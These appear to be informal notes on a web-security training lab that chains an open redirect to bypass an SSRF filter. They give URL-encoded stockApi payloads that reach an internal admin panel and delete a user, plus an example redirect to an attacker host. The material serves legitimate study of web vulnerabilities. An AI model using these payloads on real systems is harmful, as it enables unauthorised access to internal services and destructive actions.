Bypassing SSRF filters via open redirection

Goal: change the stock check url to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos

you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target.

For example, suppose the application contains an open redirection vulnerability in which the following URL:

/product/nextProduct?currentProductId=6&path=http://evil-user.net

We see this when clicking on the "next" button
GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/1.1

Openredirect is where the application wil redirect you to an arbitrary url
You can use this to exploit the ssrf vuln

To do that- instead of /product/stock/check/productid

you can add the openredirect path that we had.... copy it and paste it under stockApi
stockApi=/product/nextProduct?currentProductId=1&path=http://<ip>admin

URL Encode:
/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin

Delete user:
/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
